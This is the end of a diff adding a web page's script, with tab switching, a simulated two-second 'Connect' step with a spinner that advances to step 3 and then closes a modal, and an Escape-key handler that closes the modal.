+    document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
+    document.getElementById('tab-' + tab).classList.add('active');
+    btn.classList.add('active');
+  }
+
+  function handleConnect() {
+    const btn = document.getElementById('connect-btn');
+    btn.disabled = true;
+    btn.innerHTML = `<span class="spinner"></span> Connecting...`;
+    setTimeout(() => {
+      btn.disabled = false;
+      btn.innerHTML = 'Connect';
+      showStep(3);
+      setTimeout(() => closeModal(), 3000);
+    }, 2000);
+  }
+
+  /* ── Keyboard close ── */
+  document.addEventListener('keydown', e => { if (e.key === 'Escape') closeModal(); });
+</script>
+</body>
+</html>
+
+
+
